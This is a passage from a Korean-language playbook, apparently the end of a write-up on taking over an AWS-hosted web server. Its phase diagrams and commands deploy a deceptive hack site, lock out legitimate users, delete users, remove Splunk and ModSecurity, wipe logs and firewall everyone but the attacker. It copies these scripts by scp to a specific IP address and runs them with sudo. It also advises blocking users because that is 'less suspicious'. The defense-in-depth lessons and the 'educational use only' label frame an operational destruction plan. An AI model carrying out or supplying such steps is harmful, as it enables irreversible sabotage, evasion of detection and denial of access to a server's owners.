│ • 정상 ↔ 해킹 왔다갔다                     │
│ • 백업 복구 기능                           │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│ Phase 6: 사용자 차단 (권장!)               │
├─────────────────────────────────────────────┤
│ • SSH: AllowUsers root sysadmin           │
│ • 비밀번호: passwd -l (잠금)              │
│ • Shell: /sbin/nologin (무효화)           │
│ → root, sysadmin만 접속 가능!             │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│ Phase 7: 최종 파괴 (매우 위험!)            │
├─────────────────────────────────────────────┤
│ • 사용자 전부 삭제                         │
│ • Splunk SIEM 제거                        │
│ • ModSecurity 무력화                      │
│ • 로그 전부 삭제                           │
│ • SSH 봉쇄 (공격자만)                     │
│ • Cron 제거                               │
│ • 방화벽 설정 (공격자 IP만)               │
│ → 복구 불가능!                            │
└─────────────────────────────────────────────┘
```

---

## 📁 파일 전송 명령어 (최신판)

```bash
# 서버로 전송 (모든 스크립트)
scp DEPLOY_HACK_V2.sh TOGGLE_SITE.sh LOCKDOWN_USERS.sh FINAL_DESTRUCTION.sh \
    sysadmin@13.125.78.181:~/

# 서버 접속
ssh sysadmin@13.125.78.181

# 실행 권한
chmod +x *.sh

# 사용법
sudo bash DEPLOY_HACK_V2.sh     # 해킹 사이트 배포 (PDF 위장)
sudo bash TOGGLE_SITE.sh        # 정상 ↔ 해킹 토글
sudo bash LOCKDOWN_USERS.sh     # 사용자 차단 (권장)
sudo bash FINAL_DESTRUCTION.sh  # 최종 파괴 (매우 위험!)
```

---

## 🎓 핵심 교훈 (최종)

### 1. 공격 체인의 진화
```
단순 웹 해킹 (과거)
  → 웹서버 장악

현대 클라우드 공격 (현재)
  → 웹 취약점
  → 클라우드 Credentials
  → 전체 인프라 장악
  → 보안 시스템 무력화
  → 복구 불가능
```

### 2. Defense in Depth의 중요성
```
Layer 1: WAF → 우회됨
Layer 2: IMDS → 취약함
Layer 3: IAM → 과도한 권한
Layer 4: SSM → Root 권한
Layer 5: 로그/모니터링 → 제거됨

→ 모든 계층이 무너짐!
```

### 3. 사용자 관리 전략
```
❌ 삭제: 너무 명확함 (복구 시도)
✅ 차단: 덜 의심스러움 (SSH + passwd + shell)
```

### 4. 로그의 중요성
```
Before: 로그 있음 → 공격 추적 가능
After: 로그 삭제 → 무슨 일이 있었는지 모름
```

---

**분석 완료!** 🎉

**전체 공격 체인**: 웹 취약점 → AWS 장악 → 시스템 파괴 → 복구 불가능

**교육 목적으로만 사용하세요!**
